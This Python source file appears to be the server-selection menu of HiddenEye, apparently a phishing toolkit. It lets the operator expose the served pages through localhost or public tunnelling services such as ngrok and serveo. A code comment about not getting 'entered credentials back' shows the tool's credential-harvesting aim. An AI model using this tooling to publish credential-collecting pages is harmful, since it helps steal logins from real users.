#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#


from Defs.ImportManager.unsorted_will_be_replaced import run_command
import Defs.ThemeManager.theme as theme
import Defs.ActionManager.Server.server_runner as server_runner
import Defs.LocalizationManager.lang_action_manager.lang_server.lang_server_menu as localization
import Defs.LocalizationManager.lang_global_usage as global_localization
import Defs.ActionManager.main_runner as main_runner

default_palette = theme.default_palette







def server_selection(port):  # Question where user must select server
    run_command('clear')
    #print('''
    #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
    #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
    #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
    #    {0}http://github.com/darksecdevelopers
    #    {0}** BY:DARKSEC ** \n\n-------------------------------\n

    # )
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(localization.lang_server_selection["server_selection"])
    print(localization.lang_server_selection["select_any_available_server"])
    main_runner.print_sorted_as_menu(localization.lang_server_selection["servers_list"])
    choice = input(global_localization.input_line)
    choice = choice.zfill(2)
    if choice == '00':
        run_command('clear')
        server_runner.start_localhost(port) #FIXED
    elif choice == '01':
        run_command('clear')
        server_runner.start_ngrok(port) # FIXED
    elif choice == '02':
        run_command('clear')
        server_runner.start_serveo(port) # ALMOST FIXED
    elif choice == '03':
        run_command('clear')
        server_runner.start_localxpose(port) # DOESN'T GET ENTERED CREDENTIALS BACK
    elif choice == '04':
        run_command('clear')
        server_runner.start_localtunnel(port, True)
    elif choice == '05':
        run_command('clear')
        server_runner.start_openport(port)
    elif choice == '06':
        run_command('clear')
        server_runner.start_pagekite(port)
    else:
        run_command('clear')
        return server_selection(port)
